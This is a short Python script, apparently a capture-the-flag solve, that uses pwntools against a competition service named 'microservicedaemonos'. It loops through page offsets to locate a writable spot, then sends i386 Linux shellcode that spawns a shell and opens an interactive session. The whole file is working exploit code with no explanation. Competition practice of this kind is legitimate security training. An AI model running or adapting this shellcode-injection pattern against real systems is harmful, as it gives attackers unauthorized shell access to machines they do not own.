import pwn


def remote():
    conn = pwn.remote("microservicedaemonos.ctfcompetition.com", 1337)
    line = conn.readline()
    print(line)
    line = conn.read(numb=len('Provide command: '))
    print(line)
    conn.writeline('l')  # command l
    line = conn.read(numb=len('Provide type of trustlet: '))
    print(line)
    conn.writeline('0')  #   trustlet type 1

    line = None
    offs = 0
    while offs <= 0x7ff1:
        print('offset', offs)
        line = conn.read(numb=len('Provide command: '))
        print(line)
        conn.writeline('c')  # command c
        line = conn.read(numb=len('Provide index of ms: '))
        print(line)
        conn.writeline('0')  #   index of ms
        line = conn.read(numb=len('call type: '))
        print(line)
        conn.writeline('g')  #   call type
        line = conn.read(numb=len('provide page offset: '))
        print(line)
        conn.writeline(str(offs))  #   offset
        line = conn.read(numb=len('provide page count: '))
        print(line)
        conn.writeline(str(1))  # count
        line = conn.readline()
        print(line)
        if line == '0':
            break
        offs += 1

    conn.writeline(pwn.asm(pwn.shellcraft.i386.linux.sh()))
    conn.writeline('')
    conn.interactive()

remote()
